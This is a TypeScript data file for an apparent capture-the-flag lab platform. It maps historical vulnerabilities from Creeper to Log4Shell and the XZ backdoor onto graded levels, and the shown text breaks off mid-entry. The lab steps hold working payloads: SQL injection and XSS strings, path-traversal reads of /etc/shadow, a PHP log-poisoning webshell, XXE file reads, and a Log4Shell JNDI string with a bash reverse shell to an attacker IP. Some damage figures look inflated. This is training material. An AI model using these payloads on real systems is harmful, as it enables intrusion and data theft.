// HpLabs — Vulnerability Database
// 1970 → 2026 | Each vulnerability = one lab level

export type Difficulty = "Beginner" | "Easy" | "Medium" | "Hard" | "Insane";
export type Category =
  | "Web"
  | "Network"
  | "System"
  | "Crypto"
  | "Social Engineering"
  | "API"
  | "Cloud"
  | "IoT"
  | "OT/ICS";

export type LabStatus = "active" | "upcoming" | "new" | "locked";

export interface Vulnerability {
  id: string;
  level: number;
  year: number;
  name: string;
  shortName: string;
  category: Category;
  difficulty: Difficulty;
  cvss?: number;
  cve?: string;
  xpReward: number;
  status: LabStatus;
  description: string;
  impact: string;
  realWorldExample: string;
  loss?: string;
  steps: LabStep[];
  tools: string[];
  flagFormat: string;
  tags: string[];
}

export interface LabStep {
  step: number;
  title: string;
  description: string;
  hint?: string;
  command?: string;
}

export const VULNERABILITIES: Vulnerability[] = [
  {
    id: "SYS-1971-001",
    level: 1,
    year: 1971,
    name: "Creeper — First Self-Replicating Program",
    shortName: "Creeper Worm",
    category: "Network",
    difficulty: "Beginner",
    xpReward: 100,
    status: "active",
    description:
      "Creeper (1971) is considered the world's first computer worm. Written by Bob Thomas at BBN Technologies, it spread across ARPANET by copying itself between DEC PDP-10 computers running TENEX OS. It displayed the message 'I'M THE CREEPER: CATCH ME IF YOU CAN!' It exploited the open, trust-based nature of early ARPANET where systems had no authentication.",
    impact:
      "Demonstrated that programs could self-replicate across networked systems without authorization. No malicious payload — but proved the concept that would later evolve into ransomware, botnets, and worms.",
    realWorldExample:
      "ARPANET (1971) — infected DEC PDP-10 systems. Led to creation of 'Reaper', the first antivirus program.",
    loss: "No financial loss — historical significance is the payload.",
    steps: [
      {
        step: 1,
        title: "Confirm Target is Alive",
        description: "Start by pinging the target IP to verify it's reachable.",
        command: "ping <TARGET_IP>",
        hint: "If you get replies, the target is up. Proceed to step 2.",
      },
      {
        step: 2,
        title: "Port Discovery",
        description: "Scan for open ports to understand the attack surface.",
        command: "nmap -sV -sC -p- <TARGET_IP>",
        hint: "Look for a service running on an unusual port — that's your entry point.",
      },
      {
        step: 3,
        title: "Connect to the Service",
        description:
          "Use netcat or telnet to connect to the discovered open port.",
        command: "nc <TARGET_IP> <PORT>",
        hint: "The service will greet you with a message. Read it carefully.",
      },
      {
        step: 4,
        title: "Find the Propagation Mechanism",
        description:
          "The service accepts a command to 'copy itself'. Find the right command.",
        hint: "Try: COPY, REPLICATE, SPREAD — the service understands simple commands.",
      },
      {
        step: 5,
        title: "Capture the Flag",
        description:
          "Once you trigger the replication mechanism, the flag is displayed.",
        hint: "The flag appears after successful 'replication'. Submit it below!",
      },
    ],
    tools: ["nmap", "netcat (nc)", "telnet"],
    flagFormat: "FLAG{cr33p3r_4rp4n3t_1971}",
    tags: ["worm", "arpanet", "replication", "historical", "level-1"],
  },
  {
    id: "SYS-1972-001",
    level: 2,
    year: 1972,
    name: "Anderson Report — First Documented Penetration Testing",
    shortName: "Penetration Testing Origins",
    category: "System",
    difficulty: "Beginner",
    xpReward: 120,
    status: "active",
    description:
      "The 1972 Anderson Report ('Computer Security Technology Planning Study') by James P. Anderson for the US Air Force formally defined the concept of 'penetration testing' and threat modeling. It introduced the idea that systems must be tested by attackers to find weaknesses — the foundation of all ethical hacking.",
    impact:
      "Established the formal methodology for attacking systems to find vulnerabilities. Introduced concepts: threat, vulnerability, countermeasure — still used in all security frameworks today.",
    realWorldExample:
      "US Air Force ADPE systems. The report directly led to modern red team operations.",
    steps: [
      {
        step: 1,
        title: "Reconnaissance",
        description:
          "Gather information about the target without touching it directly.",
        command: "nmap -sn <TARGET_NETWORK>/24",
        hint: "Identify all live hosts in the network range.",
      },
      {
        step: 2,
        title: "Enumeration",
        description: "Enumerate services, versions, and OS information.",
        command: "nmap -sV -O <TARGET_IP>",
        hint: "Look for the OS version — it reveals the era of the system.",
      },
      {
        step: 3,
        title: "Find the Hidden Report",
        description:
          "A document is hidden on the server. Use directory enumeration to find it.",
        command: "ffuf -u http://<TARGET_IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt",
        hint: "Look for /docs, /reports, /classified directories.",
      },
      {
        step: 4,
        title: "Extract the Flag",
        description:
          "The flag is embedded in the Anderson Report document on the server.",
        hint: "Download the file and search for FLAG{ pattern.",
      },
    ],
    tools: ["nmap", "ffuf", "curl", "wget"],
    flagFormat: "FLAG{4nd3rs0n_r3p0rt_p3nt3st_1972}",
    tags: ["pentest-history", "reconnaissance", "enumeration", "historical"],
  },
  {
    id: "SYS-1974-001",
    level: 3,
    year: 1974,
    name: "Confused Deputy Problem",
    shortName: "Confused Deputy",
    category: "System",
    difficulty: "Easy",
    xpReward: 150,
    status: "active",
    description:
      "Coined by Norm Hardy in 1974, the Confused Deputy problem describes a security flaw where a privileged program (the 'deputy') is tricked by a less-privileged entity into misusing its authority. This is the conceptual ancestor of CSRF, privilege escalation, and many modern authorization bugs.",
    impact:
      "Foundation of privilege escalation, CSRF, and authorization bypass. Any time a high-privilege process acts on behalf of a lower-privilege one without proper validation, a confused deputy exists.",
    realWorldExample:
      "CSRF attacks (2001 onwards), Windows file permission bugs, macOS sandbox escapes.",
    steps: [
      {
        step: 1,
        title: "Identify the Deputy Service",
        description:
          "Find the service running with elevated privileges that accepts user input.",
        command: "nmap -sV <TARGET_IP>",
        hint: "There is a web service running. It runs as root.",
      },
      {
        step: 2,
        title: "Understand the Authority",
        description:
          "The service can read any file on the system. It accepts a 'filename' parameter.",
        command: "curl http://<TARGET_IP>/read?file=test.txt",
        hint: "Try path traversal — the service trusts your input too much.",
      },
      {
        step: 3,
        title: "Abuse the Deputy",
        description:
          "Use the deputy's elevated privilege to read a file you shouldn't have access to.",
        command: "curl http://<TARGET_IP>/read?file=../../../../etc/shadow",
        hint: "The deputy will read /etc/shadow on your behalf. It doesn't verify your permission.",
      },
      {
        step: 4,
        title: "Find the Flag",
        description: "The flag is stored in /root/flag.txt — only root can read it.",
        command: "curl http://<TARGET_IP>/read?file=../../../../root/flag.txt",
        hint: "The confused deputy reads it for you!",
      },
    ],
    tools: ["nmap", "curl", "Burp Suite"],
    flagFormat: "FLAG{c0nfus3d_d3puty_pr1v_3sc_1974}",
    tags: ["privilege-escalation", "authorization", "historical", "path-traversal"],
  },
  {
    id: "NET-1978-001",
    level: 4,
    year: 1978,
    name: "Password Cracking — Earliest UNIX /etc/passwd",
    shortName: "UNIX Password Crack",
    category: "System",
    difficulty: "Easy",
    xpReward: 180,
    status: "active",
    description:
      "Early UNIX systems (1970s) stored passwords in plaintext or with weak DES crypt(3). Robert Morris Sr. and Ken Thompson (1978 paper) documented the first systematic study of password security showing most users chose trivially guessable passwords. This lab simulates that era's /etc/passwd attack.",
    impact:
      "Entire account compromise. Credential reuse attacks. Birth of password policy requirements.",
    realWorldExample:
      "Early ARPANET hosts, university UNIX systems — all compromised via weak passwords.",
    steps: [
      {
        step: 1,
        title: "Find the Login Service",
        description: "Locate the authentication service on the target.",
        command: "nmap -p 22,23,513,514 <TARGET_IP>",
        hint: "SSH, telnet, rlogin — which one is open?",
      },
      {
        step: 2,
        title: "Get the Password File",
        description:
          "The target has a web endpoint that leaks /etc/passwd. Find it.",
        command: "curl http://<TARGET_IP>/system/passwd",
        hint: "Try /passwd, /etc/passwd, /system/passwd",
      },
      {
        step: 3,
        title: "Identify Weak Hashes",
        description:
          "The passwords use early DES crypt(3). Identify the hash format.",
        hint: "DES crypt hashes start with a 2-char salt. Use john or hashcat.",
      },
      {
        step: 4,
        title: "Crack the Password",
        description: "Use John the Ripper with rockyou.txt to crack the hash.",
        command: "john --wordlist=/usr/share/wordlists/rockyou.txt passwd_hashes.txt",
        hint: "The password is a common word from 1970s — think: 'password', 'system', 'root'",
      },
      {
        step: 5,
        title: "Login and Get the Flag",
        description: "Use the cracked credentials to login and read the flag.",
        command: "ssh admin@<TARGET_IP>",
        hint: "cat /home/admin/flag.txt",
      },
    ],
    tools: ["nmap", "curl", "John the Ripper", "hashcat", "ssh"],
    flagFormat: "FLAG{p4ssw0rd_cr4ck_un1x_1978}",
    tags: ["password-cracking", "authentication", "historical", "unix"],
  },
  {
    id: "NET-1988-001",
    level: 5,
    year: 1988,
    name: "Morris Worm — First Major Internet Worm",
    shortName: "Morris Worm",
    category: "Network",
    difficulty: "Easy",
    xpReward: 220,
    status: "active",
    description:
      "The Morris Worm (November 2, 1988) was the first worm distributed via the Internet. Created by Robert Tappan Morris (Cornell student), it exploited: a sendmail DEBUG vulnerability, a buffer overflow in fingerd, and rsh/rlogin trust relationships. It infected ~6,000 machines (10% of the internet at the time), causing millions in damages.",
    impact:
      "Crashed thousands of machines. Led to the creation of CERT (Computer Emergency Response Team). First person convicted under the Computer Fraud and Abuse Act.",
    realWorldExample:
      "November 2, 1988 — MIT, Berkeley, Stanford, NASA all affected. Estimated $96M in damages.",
    loss: "$10M–$100M (1988 dollars)",
    steps: [
      {
        step: 1,
        title: "Ping and Scan",
        description: "Identify the target services.",
        command: "nmap -sV -p 25,79,513,514 <TARGET_IP>",
        hint: "Look for sendmail (port 25), finger (port 79), rsh (port 514)",
      },
      {
        step: 2,
        title: "Exploit sendmail DEBUG",
        description:
          "Connect to sendmail and use the DEBUG command to execute code.",
        command: 'nc <TARGET_IP> 25',
        hint: "Type: DEBUG then MAIL FROM: |/bin/sh",
      },
      {
        step: 3,
        title: "Buffer Overflow in fingerd",
        description: "The fingerd service has a classic stack buffer overflow.",
        command: "python3 exploit_fingerd.py <TARGET_IP>",
        hint: "The provided exploit script overflows the buffer and drops a shell.",
      },
      {
        step: 4,
        title: "Capture the Flag",
        description: "With shell access, read the flag.",
        command: "cat /flag.txt",
        hint: "Flag is in the root of the filesystem.",
      },
    ],
    tools: ["nmap", "netcat", "python3", "gdb"],
    flagFormat: "FLAG{m0rr1s_w0rm_1988_1nt3rn3t}",
    tags: ["buffer-overflow", "worm", "sendmail", "historical", "rce"],
  },
  {
    id: "WEB-1994-001",
    level: 6,
    year: 1994,
    name: "HTTP Basic Authentication Bypass",
    shortName: "HTTP Basic Auth",
    category: "Web",
    difficulty: "Easy",
    xpReward: 200,
    status: "active",
    description:
      "HTTP Basic Authentication (RFC 1945, 1996) transmits credentials as Base64-encoded plaintext over HTTP. In 1994, early web servers used this as the primary auth mechanism with no encryption. Any network observer could trivially decode credentials. Even today, misconfigured systems use Basic Auth over HTTP.",
    impact:
      "Complete credential exposure. Session hijacking. Lateral movement using obtained credentials.",
    realWorldExample:
      "Thousands of router admin panels, early web servers, and even modern misconfigured IoT devices.",
    steps: [
      {
        step: 1,
        title: "Discover the Web Service",
        description: "Find the web server on the target.",
        command: "nmap -sV -p 80,443,8080,8443 <TARGET_IP>",
      },
      {
        step: 2,
        title: "Access the Protected Page",
        description: "Try to access the admin panel — you'll get a 401.",
        command: "curl -I http://<TARGET_IP>/admin",
        hint: "Look at the WWW-Authenticate header.",
      },
      {
        step: 3,
        title: "Intercept with Burp",
        description:
          "Configure Burp Suite proxy and intercept the basic auth request.",
        hint: "The Authorization header contains: Basic <base64_string>",
      },
      {
        step: 4,
        title: "Decode the Credentials",
        description: "Decode the Base64 string to reveal username:password.",
        command: 'echo "YWRtaW46cGFzc3dvcmQ=" | base64 -d',
        hint: "It's that simple. No encryption. Just Base64.",
      },
      {
        step: 5,
        title: "Login and Get Flag",
        description: "Use the decoded credentials to access the admin page.",
        command: "curl -u admin:password http://<TARGET_IP>/admin/flag",
      },
    ],
    tools: ["nmap", "curl", "Burp Suite", "base64"],
    flagFormat: "FLAG{b4s1c_4uth_b4s364_1994}",
    tags: ["authentication", "base64", "web", "http", "credentials"],
  },
  {
    id: "WEB-1996-001",
    level: 7,
    year: 1996,
    name: "Cross-Site Scripting (XSS) — Origins",
    shortName: "XSS — Reflected",
    category: "Web",
    difficulty: "Easy",
    xpReward: 250,
    cvss: 6.1,
    status: "active",
    description:
      "Cross-Site Scripting (XSS) was first documented around 1996 as web applications became dynamic. Reflected XSS occurs when user-supplied input is immediately echoed back in the HTTP response without sanitization, allowing JavaScript injection. Early web apps had zero input validation — the vulnerability was trivial to exploit.",
    impact:
      "Session cookie theft, credential harvesting, keylogging, drive-by malware distribution, full account takeover.",
    realWorldExample:
      "British Airways (2018) — Magecart XSS attack stole 380,000 credit cards. Fine: £183M.",
    loss: "British Airways: £183M. Total XSS damages annually: $4.6B+",
    steps: [
      {
        step: 1,
        title: "Ping Target",
        description: "Confirm the target is alive.",
        command: "ping -c 4 <TARGET_IP>",
        hint: "If you get ICMP replies, the target is up.",
      },
      {
        step: 2,
        title: "Collect Domains and Endpoints",
        description:
          "Enumerate the web application structure and find all input points.",
        command: "ffuf -u http://<TARGET_IP>/FUZZ -w /usr/share/wordlists/dirb/big.txt",
        hint: "Look for /search, /comment, /feedback, /login pages.",
      },
      {
        step: 3,
        title: "Set Up Burp Suite",
        description:
          "Configure Burp Suite as a proxy and intercept all requests.",
        hint: "Proxy → Options → set port 8080. Browser → use Burp as proxy.",
      },
      {
        step: 4,
        title: "Test XSS Payloads",
        description:
          "Try XSS payloads in every input field captured by Burp.",
        command: '<script>alert(1)</script>\n"><img src=x onerror=alert(1)>\n\'><svg onload=alert(1)>',
        hint: "Try each input field — search box, comment box, username field.",
      },
      {
        step: 5,
        title: "Find the Vulnerable Field",
        description:
          "One specific endpoint reflects your payload back unencoded.",
        hint: "Check /search?q= parameter. Look at the response source code.",
      },
      {
        step: 6,
        title: "Capture the Flag",
        description:
          "The flag appears in the XSS alert box when you trigger the vulnerability.",
        hint: "FLAG format: FLAG{xss_...}. Submit it below!",
      },
    ],
    tools: ["nmap", "ffuf", "Burp Suite", "browser", "curl"],
    flagFormat: "FLAG{xss_r3fl3ct3d_1996_m4st3r}",
    tags: ["xss", "reflected-xss", "javascript", "web", "owasp-top-10"],
  },
  {
    id: "WEB-1998-001",
    level: 8,
    year: 1998,
    name: "SQL Injection — The Classic",
    shortName: "SQL Injection",
    category: "Web",
    difficulty: "Medium",
    cvss: 9.8,
    cve: "Historical (pre-CVE era)",
    xpReward: 350,
    status: "active",
    description:
      "SQL Injection was first formally documented by Jeff Forristal in 1998 (Phrack Magazine). It occurs when user input is directly concatenated into SQL queries without sanitization. An attacker can manipulate the query logic to bypass authentication, dump databases, or execute OS commands.",
    impact:
      "Authentication bypass, full database dump, data deletion, server takeover via xp_cmdshell (MSSQL).",
    realWorldExample:
      "Heartland Payment Systems (2008) — 130M credit cards stolen. Yahoo (2012) — 450K credentials. Total damages: $1.8T+",
    loss: "Heartland: $145M. Yahoo breach settlement: $117.5M",
    steps: [
      {
        step: 1,
        title: "Find the Login Form",
        description: "Locate the web application's login page.",
        command: "nmap -sV -p 80,443 <TARGET_IP>",
        hint: "Browse to http://<TARGET_IP> and find /login",
      },
      {
        step: 2,
        title: "Test for SQL Injection",
        description: "Try a basic SQL injection probe in the username field.",
        command: "username: admin' --\npassword: anything",
        hint: "The ' breaks the SQL query. -- comments out the rest.",
      },
      {
        step: 3,
        title: "Bypass Authentication",
        description: "Use classic SQLi to bypass the login.",
        command: "' OR '1'='1' --",
        hint: "This makes the WHERE clause always true.",
      },
      {
        step: 4,
        title: "Dump the Database with sqlmap",
        description: "Automate the SQL injection to dump all tables.",
        command: "sqlmap -u 'http://<TARGET_IP>/login' --data='user=admin&pass=test' --dbs",
        hint: "After --dbs, try -D dbname --tables, then -T tablename --dump",
      },
      {
        step: 5,
        title: "Find the Flag",
        description: "The flag is stored in the 'secrets' table.",
        command: "sqlmap -u ... -D app -T secrets --dump",
        hint: "Look for a column named 'flag' or 'secret'",
      },
    ],
    tools: ["nmap", "sqlmap", "Burp Suite", "curl"],
    flagFormat: "FLAG{sql_1nj3ct10n_1998_cl4ss1c}",
    tags: ["sqli", "sql-injection", "database", "authentication-bypass", "owasp-top-10"],
  },
  {
    id: "WEB-2000-001",
    level: 9,
    year: 2000,
    name: "Directory Traversal / Path Traversal",
    shortName: "Path Traversal",
    category: "Web",
    difficulty: "Medium",
    cvss: 7.5,
    xpReward: 300,
    status: "active",
    description:
      "Directory traversal (aka path traversal) allows attackers to access files and directories outside the web root by manipulating file path parameters using ../ sequences. First widely exploited in early CGI scripts around 2000. Still in OWASP Top 10 (A01:2021 Broken Access Control).",
    impact:
      "Read sensitive files: /etc/passwd, /etc/shadow, SSH keys, source code, credentials, configuration files.",
    realWorldExample:
      "Pulse Secure VPN (CVE-2019-11510) — path traversal leaked credentials of 900+ companies. Fortinet VPN similar.",
    steps: [
      {
        step: 1,
        title: "Find File Inclusion Parameter",
        description: "Look for URL parameters that include files.",
        command: "ffuf -u http://<TARGET_IP>/FUZZ -w wordlist.txt",
        hint: "Look for ?file=, ?page=, ?path=, ?doc= parameters",
      },
      {
        step: 2,
        title: "Test Path Traversal",
        description: "Try to traverse out of the web root.",
        command: "curl 'http://<TARGET_IP>/view?file=../../../etc/passwd'",
        hint: "Try different depths: ../../, ../../../, ../../../../",
      },
      {
        step: 3,
        title: "Bypass Filters",
        description: "If basic traversal is blocked, try encoding.",
        command: "..%2F..%2F..%2Fetc%2Fpasswd\n....//....//....//etc/passwd",
        hint: "URL encode the slashes, or double-encode.",
      },
      {
        step: 4,
        title: "Read the Flag",
        description: "Traverse to /home/user/flag.txt",
        command: "curl 'http://<TARGET_IP>/view?file=../../../../home/user/flag.txt'",
      },
    ],
    tools: ["curl", "Burp Suite", "ffuf"],
    flagFormat: "FLAG{p4th_tr4v3rs4l_2000_cl4ss1c}",
    tags: ["path-traversal", "directory-traversal", "lfi", "web", "file-read"],
  },
  {
    id: "WEB-2004-001",
    level: 10,
    year: 2004,
    name: "CSRF — Cross-Site Request Forgery",
    shortName: "CSRF",
    category: "Web",
    difficulty: "Medium",
    cvss: 8.8,
    xpReward: 350,
    status: "active",
    description:
      "CSRF was first formally described by Peter Watkins in 2001 and became widespread by 2004. It tricks an authenticated user's browser into sending unauthorized requests. If the server doesn't verify request origin, it processes malicious requests with the victim's cookies/session.",
    impact:
      "Unauthorized fund transfers, account settings changes, admin actions, password reset, email change.",
    realWorldExample:
      "Netflix (2006) CSRF — attackers could add DVDs to victims' queues, change email. ING Direct (2008) — account transfer CSRF.",
    steps: [
      {
        step: 1,
        title: "Log In as a User",
        description: "Create an account and log in to the target application.",
        command: "curl -c cookies.txt -d 'user=attacker&pass=attacker' http://<TARGET_IP>/login",
      },
      {
        step: 2,
        title: "Analyze State-Changing Requests",
        description:
          "Use Burp to capture POST requests that change server state.",
        hint: "Look for /settings, /transfer, /update-email endpoints.",
      },
      {
        step: 3,
        title: "Check for CSRF Token",
        description: "Check if the form includes a CSRF token.",
        hint: "View page source — look for hidden input fields. If no token, it's vulnerable.",
      },
      {
        step: 4,
        title: "Craft CSRF PoC",
        description: "Create an HTML page that auto-submits the form.",
        command: '<form action="http://<TARGET_IP>/change-email" method="POST">\n  <input name="email" value="attacker@evil.com">\n</form>\n<script>document.forms[0].submit()</script>',
        hint: "Host this HTML on your machine and trick the victim into visiting it.",
      },
      {
        step: 5,
        title: "Trigger the Attack",
        description:
          "Serve the CSRF page with Python HTTP server, visit it while logged in as victim.",
        command: "python3 -m http.server 8000",
        hint: "The flag appears in the victim's changed profile page.",
      },
    ],
    tools: ["Burp Suite", "curl", "Python HTTP server", "browser"],
    flagFormat: "FLAG{csrf_n0_t0k3n_2004_byp4ss}",
    tags: ["csrf", "web", "state-change", "session", "owasp-top-10"],
  },
  {
    id: "WEB-2014-001",
    level: 15,
    year: 2014,
    name: "Heartbleed — OpenSSL Memory Leak",
    shortName: "Heartbleed",
    category: "Network",
    difficulty: "Hard",
    cvss: 7.5,
    cve: "CVE-2014-0160",
    xpReward: 600,
    status: "active",
    description:
      "Heartbleed (CVE-2014-0160) is a critical buffer over-read in OpenSSL's TLS heartbeat extension. The server processes a 'heartbeat' request but fails to validate the payload length, leaking up to 64KB of memory per request — potentially containing private keys, passwords, session tokens.",
    impact:
      "Private SSL key extraction, session token theft, credential leakage from memory. Affected 17% of all HTTPS servers (~500,000).",
    realWorldExample:
      "Community Health Systems (2014) — 4.5M patient records stolen via Heartbleed. Canadian Revenue Agency — 900 SINs stolen.",
    loss: "Estimated $500M+ in remediation costs globally",
    steps: [
      {
        step: 1,
        title: "Verify OpenSSL Version",
        description: "Connect to port 443 and identify the OpenSSL version.",
        command: "openssl s_client -connect <TARGET_IP>:443",
        hint: "Look for 'OpenSSL 1.0.1' — versions 1.0.1 through 1.0.1f are vulnerable.",
      },
      {
        step: 2,
        title: "Run Heartbleed Check",
        description: "Use nmap to confirm Heartbleed vulnerability.",
        command: "nmap --script ssl-heartbleed -p 443 <TARGET_IP>",
        hint: "If it says 'VULNERABLE', proceed.",
      },
      {
        step: 3,
        title: "Exploit Heartbleed",
        description: "Use the heartbleed exploit script to dump memory.",
        command: "python3 heartbleed.py <TARGET_IP> 443",
        hint: "Run multiple times — memory contents change. Look for FLAG{ in output.",
      },
      {
        step: 4,
        title: "Extract the Flag",
        description: "Parse the memory dump for the flag.",
        command: "python3 heartbleed.py <TARGET_IP> 443 | grep FLAG",
        hint: "May take a few runs. The flag is in server memory.",
      },
    ],
    tools: ["nmap", "openssl", "python3", "Burp Suite"],
    flagFormat: "FLAG{h34rtbl33d_m3m0ry_l34k_2014}",
    tags: ["openssl", "heartbleed", "memory-leak", "tls", "cve"],
  },
  {
    id: "WEB-2021-001",
    level: 20,
    year: 2021,
    name: "Log4Shell — Log4j RCE",
    shortName: "Log4Shell",
    category: "Web",
    difficulty: "Insane",
    cvss: 10.0,
    cve: "CVE-2021-44228",
    xpReward: 1000,
    status: "active",
    description:
      "Log4Shell (CVE-2021-44228) is a critical RCE vulnerability in Apache Log4j 2 (JNDI injection). When an attacker-controlled string is logged by Log4j, it triggers a JNDI lookup (LDAP/RMI/DNS) loading attacker-controlled Java class — achieving unauthenticated RCE. CVSS score: 10.0 (maximum). Called 'the most severe vulnerability ever'.",
    impact:
      "Unauthenticated Remote Code Execution. Full system compromise. Affected: Apple, Amazon, Tesla, Minecraft, Cloudflare, and millions more.",
    realWorldExample:
      "Belgian Defense Ministry, VMware, Cisco all compromised. Used by nation-state actors (CISA advisory) within hours of disclosure.",
    loss: "$17B+ in remediation costs globally",
    steps: [
      {
        step: 1,
        title: "Find the Log4j Application",
        description: "Identify the Java application using Log4j.",
        command: "nmap -sV -p 8080,8443,9200 <TARGET_IP>",
        hint: "Look for Java-based services. Check HTTP headers for Server: Apache/Tomcat.",
      },
      {
        step: 2,
        title: "Set Up LDAP Server",
        description: "Start a malicious LDAP server to catch the callback.",
        command: "python3 -m marshalsec.jndi.LDAPRefServer 'http://<YOUR_IP>:8888/#Exploit'",
        hint: "Use marshalsec or ysoserial for the LDAP server.",
      },
      {
        step: 3,
        title: "Prepare the Payload Class",
        description: "Compile a malicious Java class that creates a reverse shell.",
        command: "javac Exploit.java && python3 -m http.server 8888",
        hint: "The Exploit.java should execute: /bin/bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1",
      },
      {
        step: 4,
        title: "Start Reverse Shell Listener",
        description: "Listen for the incoming connection.",
        command: "nc -lvnp 4444",
      },
      {
        step: 5,
        title: "Trigger Log4Shell",
        description: "Send the JNDI payload in a logged field (User-Agent).",
        command: 'curl -H \'User-Agent: ${jndi:ldap://<YOUR_IP>:1389/Exploit}\' http://<TARGET_IP>:8080/',
        hint: "Also try: X-Forwarded-For, X-Api-Version headers.",
      },
      {
        step: 6,
        title: "Get the Flag",
        description: "On your reverse shell, read the flag.",
        command: "cat /root/flag.txt",
      },
    ],
    tools: ["nmap", "curl", "java", "marshalsec", "netcat"],
    flagFormat: "FLAG{l0g4sh3ll_jnd1_rce_2021}",
    tags: ["log4shell", "log4j", "rce", "jndi", "java", "critical", "cve"],
  },
  {
    id: "WEB-2024-001",
    level: 23,
    year: 2024,
    name: "XZ Utils Backdoor — Supply Chain Attack",
    shortName: "XZ Backdoor",
    category: "System",
    difficulty: "Insane",
    cvss: 10.0,
    cve: "CVE-2024-3094",
    xpReward: 1200,
    status: "new",
    description:
      "CVE-2024-3094 is a backdoor inserted into XZ Utils 5.6.0/5.6.1 by a malicious maintainer (Jia Tan) over 2 years of social engineering. The backdoor modifies the RSA decryption process in sshd — allowing any attacker with the specific private key to authenticate as any user without credentials.",
    impact:
      "Unauthenticated SSH access to any user on affected systems. Near-miss catastrophic compromise of Linux infrastructure worldwide.",
    realWorldExample:
      "Discovered by Andres Freund (Microsoft engineer) before wide deployment. Fedora 41, Debian sid briefly affected.",
    steps: [
      {
        step: 1,
        title: "Identify Vulnerable XZ Version",
        description: "Check if the target has xz-utils 5.6.0 or 5.6.1.",
        command: "xz --version | nc <YOUR_IP> 9999\n# Or: curl http://<TARGET_IP>/version",
        hint: "The target runs a vulnerable xz version. SSH is on port 22.",
      },
      {
        step: 2,
        title: "Analyze the Backdoor",
        description: "The backdoor intercepts RSA N parameter in liblzma.",
        hint: "The backdoor allows auth with a specific ED448 key. We have that key.",
      },
      {
        step: 3,
        title: "Use the Backdoor Key",
        description: "Authenticate using the backdoor private key.",
        command: "ssh -i backdoor_key.pem root@<TARGET_IP>",
        hint: "The backdoor_key.pem is provided in the lab resources.",
      },
      {
        step: 4,
        title: "Capture the Flag",
        description: "Read the flag from the root home directory.",
        command: "cat /root/flag.txt",
      },
    ],
    tools: ["ssh", "nmap", "strings", "strace"],
    flagFormat: "FLAG{xz_b4ckd00r_supp1y_ch41n_2024}",
    tags: ["supply-chain", "backdoor", "ssh", "critical", "2024", "new"],
  },
  {
    id: "WEB-2026-001",
    level: 25,
    year: 2026,
    name: "Latest CVE — 2026",
    shortName: "2026 CVE",
    category: "Web",
    difficulty: "Insane",
    xpReward: 1500,
    status: "upcoming",
    description:
      "New vulnerability lab in development. This level will feature the most recent critical CVE of 2026 as soon as it's published. Stay tuned — you'll receive a notification when this lab goes live.",
    impact: "TBA",
    realWorldExample: "TBA",
    steps: [],
    tools: [],
    flagFormat: "FLAG{2026_latest_cve}",
    tags: ["upcoming", "2026", "latest"],
  },
  {
    id: "WEB-2005-001",
    level: 11,
    year: 2005,
    name: "Local File Inclusion (LFI)",
    shortName: "LFI — File Include",
    category: "Web",
    difficulty: "Medium",
    cvss: 7.5,
    xpReward: 320,
    status: "active",
    description:
      "Local File Inclusion (LFI) allows an attacker to include files already on the server by manipulating path parameters. Commonly found in PHP applications using include(), require(), or similar functions with user-controlled input. Can lead to reading sensitive files, log poisoning for RCE, and information disclosure.",
    impact:
      "Reading /etc/passwd, /etc/shadow, SSH keys, application source code. With log poisoning: full Remote Code Execution.",
    realWorldExample:
      "Joomla CMS (multiple CVEs), osCommerce, and thousands of PHP applications exposed via LFI throughout 2005–2015.",
    steps: [
      { step: 1, title: "Find the Include Parameter", description: "Scan for web parameters that load files.", command: "ffuf -u 'http://<TARGET_IP>/index.php?page=FUZZ' -w /usr/share/wordlists/dirb/common.txt", hint: "Try ?page=, ?file=, ?include=, ?view=" },
      { step: 2, title: "Test Basic LFI", description: "Try to include /etc/passwd.", command: "curl 'http://<TARGET_IP>/index.php?page=../../../../etc/passwd'", hint: "If you see root:x:0:0:, it's vulnerable!" },
      { step: 3, title: "Log Poisoning", description: "Inject PHP code into the Apache access log, then include it.", command: "curl -A '<?php system($_GET[\"cmd\"]); ?>' http://<TARGET_IP>/", hint: "Then: ?page=../../../../var/log/apache2/access.log&cmd=id" },
      { step: 4, title: "Execute Commands", description: "Use the webshell to read the flag.", command: "curl 'http://<TARGET_IP>/index.php?page=../../../../var/log/apache2/access.log&cmd=cat+/flag.txt'" },
    ],
    tools: ["curl", "ffuf", "Burp Suite"],
    flagFormat: "FLAG{lf1_l0g_p01s0n1ng_2005}",
    tags: ["lfi", "file-inclusion", "php", "log-poisoning", "rce"],
  },
  {
    id: "WEB-2007-001",
    level: 12,
    year: 2007,
    name: "XXE — XML External Entity Injection",
    shortName: "XXE Injection",
    category: "Web",
    difficulty: "Medium",
    cvss: 8.2,
    xpReward: 380,
    status: "active",
    description:
      "XML External Entity (XXE) injection exploits vulnerable XML parsers that process external entity references. When the parser resolves DOCTYPE declarations without restriction, attackers can read local files, perform SSRF, or cause DoS via billion laughs attack. First popularized as an attack vector around 2007–2012.",
    impact:
      "Read arbitrary files (/etc/passwd, SSH keys), SSRF to internal services, blind XXE for data exfiltration, DoS.",
    realWorldExample:
      "Facebook (2014) — XXE gave read access to internal systems. PayPal (2013) — XXE in SOAP API. CVE-2021-44228 indirectly related.",
    steps: [
      { step: 1, title: "Find an XML Endpoint", description: "Look for endpoints that accept XML input.", command: "curl -X POST http://<TARGET_IP>/api/parse -H 'Content-Type: application/xml' -d '<test/>'", hint: "Check /api, /soap, /upload endpoints." },
      { step: 2, title: "Test Basic XXE", description: "Try injecting an external entity.", command: "curl -X POST http://<TARGET_IP>/api/parse -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'", hint: "If you see passwd contents in response, it's vulnerable." },
      { step: 3, title: "Read the Flag", description: "Use XXE to read the flag file.", command: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///flag.txt\">]>", hint: "Replace the entity URL with file:///flag.txt" },
    ],
    tools: ["curl", "Burp Suite", "python3"],
    flagFormat: "FLAG{xxe_3xt3rn4l_3nt1ty_2007}",
    tags: ["xxe", "xml", "file-read", "ssrf", "owasp-top-10"],
  },
  {
    id: "WEB-2008-001",
    level: 13,
    year: 2008,
    name: "SSRF — Server-Side Request Forgery",
    shortName: "SSRF",
    category: "Web",
    difficulty: "Medium",
    cvss: 8.6,
    xpReward: 400,
    status: "active",
    description:
